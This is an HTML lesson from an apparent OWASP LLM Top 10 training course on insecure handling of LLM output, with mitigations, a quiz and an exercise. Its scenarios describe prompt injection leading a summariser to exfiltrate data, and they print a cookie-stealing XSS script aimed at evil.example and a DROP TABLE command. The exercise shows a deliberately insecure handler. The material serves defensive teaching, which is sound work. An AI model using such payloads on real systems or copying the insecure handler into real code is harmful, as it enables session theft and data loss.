@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lesson 6: Insecure Output Handling — OWASP LLM Top 10</title>
+  <link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="container">
+
+  <header class="lesson-header">
+    <div class="breadcrumb">
+      <a href="../lessons.md">Course index</a> &rsaquo; Module 3: Output, Trust &amp; Infrastructure &rsaquo; Lesson 6 of 13
+    </div>
+    <h1>Insecure Output Handling</h1>
+    <div class="lesson-meta">
+      <span>~13 min</span>
+      <span>Module 3: Output &amp; Infrastructure</span>
+      <span>LLM02 / LLM10:2026</span>
+    </div>
+  </header>
+
+  <div class="source-card">
+    <strong>Primary source</strong>
+    OWASP LLM Top 10 v1.1 — LLM02: Insecure Output Handling<br>
+    <a href="https://raw.githubusercontent.com/OWASP/www-project-top-10-for-large-language-model-applications/main/Archive/1_1_vulns/LLM02_InsecureOutputHandling.md">https://raw.githubusercontent.com/OWASP/www-project-top-10-for-large-language-model-applications/main/Archive/1_1_vulns/LLM02_InsecureOutputHandling.md</a>
+  </div>
+
+  <h2>Why LLM Output Is a Security Boundary</h2>
+
+  <p>
+    Classic web security draws a bright line between code and data, and between
+    trusted server-side logic and untrusted user input. Input validation at the
+    boundary is the primary defense: if you scrub what comes in, what goes out is
+    safe.
+  </p>
+
+  <p>
+    LLMs break this assumption entirely. An LLM takes validated input and
+    <em>synthesizes new content</em> from it — mixing the user's words with
+    everything the model learned during training and with any documents retrieved
+    at runtime. The output is therefore not a processed version of the input; it
+    is a generated artifact that the model assembled token by token from a vast,
+    partially adversarially influenced knowledge base.
+  </p>
+
+  <p>
+    This means the output is a <strong>new security boundary</strong>. Even if
+    the request passed every input filter you have, the response the model writes
+    back may contain:
+  </p>
+
+  <ul>
+    <li>JavaScript fragments drawn from training examples of web code;</li>
+    <li>SQL keywords synthesized in response to a natural-language query;</li>
+    <li>Markdown that a browser or renderer will execute as HTML;</li>
+    <li>Shell commands that a plugin or agentic tool will run without question.</li>
+  </ul>
+
+  <div class="callout key">
+    The input is what the user sent. The output is what the model built. They are
+    not the same thing, and your defenses must treat them as separate attack surfaces.
+    Validating the input does not validate the output.
+  </div>
+
+  <p>
+    OWASP defines this vulnerability as <em>insufficient validation and sanitization
+    of LLM-generated outputs before they reach downstream systems</em>. Because
+    outputs can be shaped by prompt input, attackers who control the input gain
+    "indirect access to additional functionality" — they can coerce the model into
+    writing content that exploits whatever system ultimately consumes that output.
+  </p>
+
+  <h2>Four Attack Scenarios</h2>
+
+  <p>
+    The OWASP specification describes four concrete attack chains. Each follows the
+    same pattern: the attacker shapes the model's input → the model produces
+    dangerous output → the output reaches a downstream system without validation
+    → the exploit executes.
+  </p>
+
+  <h3>Scenario 1 — Plugin triggers unintended system action</h3>
+  <p>
+    An LLM application exposes a web browsing plugin. The attacker crafts a prompt
+    that causes the LLM to generate a response invoking the plugin with a
+    destructive command — for example, calling an admin endpoint that triggers an
+    application shutdown. The plugin executes the request because it trusts the
+    model's output as if it were authorised user intent.
+  </p>
+
+  <h3>Scenario 2 — Summariser exfiltrates data via injected instructions</h3>
+  <p>
+    A document summarisation tool is given a document that contains hidden prompt
+    injection instructions (see Lesson 4). The instructions tell the model to
+    encode sensitive data found earlier in the conversation and append a request to
+    an attacker-controlled URL. The tool passes the model's output to a plugin
+    that makes HTTP requests — and the data leaves the network.
+  </p>
+
+  <h3>Scenario 3 — Chat interface executes destructive SQL</h3>
+  <p>
+    A natural-language SQL interface lets users ask questions about a database in
+    plain English. An attacker phrases a question such that the model generates
+    <code>DROP TABLE users;</code> as part of its response. The application passes
+    the raw LLM output directly to the database driver. The table is deleted.
+  </p>
+
+  <h3>Scenario 4 — Unsanitised output causes XSS in the browser</h3>
+  <p>
+    A chat application renders LLM responses directly as HTML. An attacker causes
+    the model to include <code>&lt;script&gt;document.location='https://evil.example/steal?c='+document.cookie&lt;/script&gt;</code>
+    in its output. The browser executes the script, exfiltrating session cookies to
+    the attacker.
+  </p>
+
+  <div class="callout warning">
+    A common misconception is that XSS via LLM requires a sophisticated jailbreak.
+    In practice, many models will include JavaScript in their output simply because
+    a user asked a coding question, or because retrieved context contained script
+    examples. The application's failure is not the model's response — it is the
+    decision to render that response without encoding it first.
+  </div>
+
+  <h2>The Zero-Trust Output Principle</h2>
+
+  <p>
+    The mitigation that unifies all four scenarios is a single mental model:
+    <strong>treat every token the LLM produces as if it came from an untrusted
+    external user, exactly as you treat HTTP request parameters.</strong>
+  </p>
+
+  <p>
+    This is the <em>zero-trust output principle</em>. It is not pessimism about
+    the model; it is an accurate description of the situation. The model's output
+    is the product of training data you did not fully control, retrieval sources
+    you may not have audited, and prompt text that may have been shaped by an
+    adversary. You cannot inspect the model's "intent". You can only observe what
+    it wrote — and apply the same defenses you would apply to any untrusted string.
+  </p>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Analogy</th>
+        <th>Untrusted source</th>
+        <th>Defense applied at boundary</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Classic web app</td>
+        <td>HTTP request body (user input)</td>
+        <td>Input validation, output encoding</td>
+      </tr>
+      <tr>
+        <td>LLM application</td>
+        <td>LLM response (model output)</td>
+        <td>Output validation, output encoding</td>
+      </tr>
+      <tr>
+        <td>LLM with plugins</td>
+        <td>LLM response used as plugin argument</td>
+        <td>Parameterised inputs, schema validation</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="callout key">
+    The OWASP guidance is explicit: apply zero-trust to model output. Do not grant
+    the model elevated trust just because it sits on your server. The data plane
+    and the control plane are not separated in LLM systems — model text can become
+    instructions or executable code the moment it reaches the next system.
+  </div>
+
+  <h2>Practical Mitigations</h2>
+
+  <p>
+    OWASP recommends four concrete controls, each targeting one layer of the
+    output handling pipeline.
+  </p>
+
+  <h3>1. HTML-encode output before rendering</h3>
+  <p>
+    Any LLM response that will be rendered in a browser must be HTML-encoded before
+    being written into the DOM. This converts characters like <code>&lt;</code>,
+    <code>&gt;</code>, and <code>&amp;</code> into their entity equivalents,
+    preventing the browser from interpreting them as markup. Use a well-tested
+    library function — never write your own encoder.
+  </p>
+
+  <h3>2. Never interpolate LLM text directly into SQL</h3>
+  <p>
+    If an LLM generates or contributes to a database query, the model's text must
+    never be string-concatenated into a SQL statement. Use parameterised queries or
+    prepared statements. This applies even when the model's role is to translate a
+    natural-language question into SQL: always parse and re-parameterise the output
+    before execution, or use a query builder that enforces parameterisation.
+  </p>
+
+  <h3>3. Declare and enforce content types</h3>
+  <p>
+    Set explicit <code>Content-Type</code> headers on every response that carries
+    LLM output. <code>text/plain</code> prevents browsers from executing HTML or
+    JavaScript in a response they expected to be plain text. This is a second layer
+    of defense that reduces the blast radius when encoding fails.
+  </p>
+
+  <h3>4. Follow OWASP ASVS for downstream validation</h3>
+  <p>
+    The <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard (ASVS)</a>
+    defines specific validation requirements for output. Apply the same ASVS
+    validation checklist at plugin or integration layer boundaries that you would
+    apply to any externally received data. Treat the model's output as the
+    integration boundary — not the user's original request.
+  </p>
+
+  <!-- ── Quiz ── -->
+  <div class="quiz" id="quiz-6">
+    <p>Why must LLM output be treated as untrusted even when the user's input was carefully validated?</p>
+    <div class="quiz-options">
+      <button>Because the model may synthesize malicious content drawn from its training data or from injected retrieval context.</button>
+      <button>Because LLM vendors have not yet implemented any reliable output filtering features inside their hosted API endpoints.</button>
+      <button>Because input validation never examines token count and a long LLM response can overwhelm any downstream parser.</button>
+    </div>
+    <div class="quiz-feedback"></div>
+  </div>
+
+  <!-- ── Exercise ── -->
+  <div class="exercise">
+    <p>
+      The following pseudo-code sends an LLM response directly to the client without
+      any output handling:
+    </p>
+    <pre><code>// Insecure: raw LLM output sent straight to the browser
+app.get('/chat', (req, res) => {
+  const userInput = req.query.message;
+  const answer    = llm.complete(userInput);
+  res.send(answer);               // ← no encoding, no Content-Type
+});</code></pre>
+    <p>
+      Rewrite this handler with proper output handling. Your answer should include:
+    </p>
+    <ol>
+      <li>HTML encoding of the model's response before it is written into the response body.</li>
+      <li>An explicit <code>Content-Type</code> declaration.</li>
+      <li>A short comment (2–3 sentences) explaining why zero-trust applies here — even though <code>userInput</code> comes from a validated query parameter.</li>
+    </ol>
+    <textarea placeholder="// Your rewritten handler here — include HTML encoding, Content-Type, and the zero-trust comment."></textarea>
+  </div>
+
+  <div class="tutor-prompt">
+    After you've written your handler, ask yourself: if an attacker embedded
+    prompt injection instructions in an external document that the LLM retrieved
+    during this request, would your encoding still protect the browser? What would
+    need to fail for the XSS to succeed anyway?
+  </div>
+
+  <!-- ── Navigation ── -->
+  <nav class="lesson-nav">
+    <a href="0005-training-data-poisoning.html">&larr; Lesson 5: Training Data Poisoning</a>
+    <a href="0007-sensitive-information-disclosure.html" class="primary">Lesson 7: Sensitive Information Disclosure &rarr;</a>
+  </nav>
+
+</div>
+
+<script src="../assets/quiz.js"></script>
+<script>
+  initQuiz(
+    'quiz-6',
+    0,
+    'Correct. Even perfectly validated input can be transformed by the LLM into output containing malicious patterns — drawn from training data, injected retrieval context, or adversarial instructions embedded in retrieved documents. Input validation controls what enters the model; it cannot control what the model synthesizes on the way out. That is why the output must be treated as a new, untrusted boundary.'
+  );
+</script>
+</body>
+</html>
